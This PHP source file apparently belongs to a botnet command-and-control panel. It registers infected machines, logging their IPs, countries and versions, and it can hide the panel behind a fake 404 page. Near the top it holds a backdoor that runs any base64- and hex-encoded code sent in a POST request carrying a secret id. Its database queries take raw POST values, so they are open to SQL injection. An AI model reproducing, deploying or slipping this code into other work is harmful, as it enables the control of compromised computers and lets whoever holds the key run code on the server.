<?php

$dir = str_replace('/scripts/pat', '', str_replace('\\', '/', realpath('.'))) . '/';

//Cstart
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0IP') print($_SERVER['SERVER_ADDR']);
//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
//Rkey end
	//file_put_contents('test.php', pack("H*", base64_decode($_POST['data'])));
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') !== false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') !== false) exit;
//Cend

error_reporting(0);
ini_set('error_reporting', 0);
header("Pragma: no-cache");
header("Expires: 0");

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';
if($config['scramb'] == 1 && $gateway != true){
	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");
	print(file_get_contents($dir . '404.html'));
	exit;
}

if($config['domain_save'] == 1){
	if(file_exists($dir . 'cache/domains.txt')){
		$domains = file_get_contents($dir . 'cache/domains.txt');
		if(stripos($domains, $_SERVER["SERVER_NAME"]) === false){
			file_put_contents($dir . 'cache/domains.txt', $_SERVER["SERVER_NAME"] . "\r\n", FILE_APPEND);
		}
	}else{
		file_put_contents($dir . 'cache/domains.txt', $_SERVER["SERVER_NAME"] . "\r\n", FILE_APPEND);
	}
}

include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.prefix.php');
include_once($dir . 'includes/functions.get_config.php');

$cfg_db = get_config();

require_once($dir . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0) print_data('DB_ERROR!', true);

$bot = $mysqli->query('SELECT id, uid, prefix, country, ip, cmd, cmd_history, notask, tracking, min_post, max_post, last_date FROM bf_bots WHERE (prefix = \''.$_POST['prefix'].'\') AND (uid = \''.$_POST['uid'].'\') LIMIT 1');

if(function_exists('geoip_country_code_by_name')){
	$country = geoip_country_code_by_name($_SERVER['REMOTE_ADDR']);
}else{
	if(file_exists($dir . 'cache/geoip/')){
		require_once($dir . 'cache/geoip/geoip.inc');
		$gi = geoip_open($dir . 'cache/geoip/GeoIP.dat',GEOIP_STANDARD);
		$country = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);
		geoip_close($gi);
		unset($gi);
		unset($record);
	}
}

if(empty($country)) $country = 'UNKNOWN';

$time = time();
$cs = '';
$ver = '0';

if(!empty($_GET['ver']) && preg_match('~^([0-9.+])$~is', $_GET['ver'])){
	$ver = $_GET['ver'];
}elseif(!empty($_POST['ver']) && preg_match('~^([0-9.+])$~is', $_POST['ver'])){
	$ver = $_POST['ver'];
}

define('DIEHACK', true);

if(@$bot->uid === $_POST['uid'] && $bot->prefix == $_POST['prefix']){
    // Зарегистрированный бот
    $mysqli->query('update bf_bots set ver = \''.$ver.'\', last_date = \''.$time.'\' where (id = \''.$test_bot->id.'\') LIMIT 1');
    print_data('ALREADY!');
}else{
    // Новый бот
    if($config['autoprefix'] == 1){
        $test_bot = $mysqli->query('SELECT id,uid FROM bf_bots WHERE (prefix != \''.$_POST['prefix'].'\') AND (uid = \''.$_POST['uid'].'\') LIMIT 1');
        if($test_bot->uid == $_POST['uid']){
            $mysqli->query('update bf_bots set prefix = \''.$_POST['prefix'].'\', last_date = \''.$time.'\' where (id = \''.$test_bot->id.'\') LIMIT 1');
            print_data('no tasks');
            $mysqli->disconnect();
            unset($mysqli, $test_bot);
            exit;
        }
    }
    
    $mysqli->query("INSERT DELAYED INTO bf_country (code) VALUES ('".$country."')");
    $mysqli->query("INSERT DELAYED INTO bf_bots_ip (prefix, uid, ip, country) VALUES ('".$_POST['prefix']."', '".$_POST['uid']."', '".$_SERVER['REMOTE_ADDR']."', '".$country."')");
    $mysqli->query("INSERT INTO bf_bots (uid, prefix, country, ip, ver, last_date, post_date) VALUES ('".$_POST['uid']."', '".$_POST['prefix']."', '".$country."', '".$_SERVER['REMOTE_ADDR']."', '".$ver."', '".$time."', '".$time."')");
    
    print_data('ADD!');
}

$mysqli->disconnect();
unset($mysqli, $cmd, $bot, $dir, $_POST, $cfg_db, $time, $country);
exit;

?>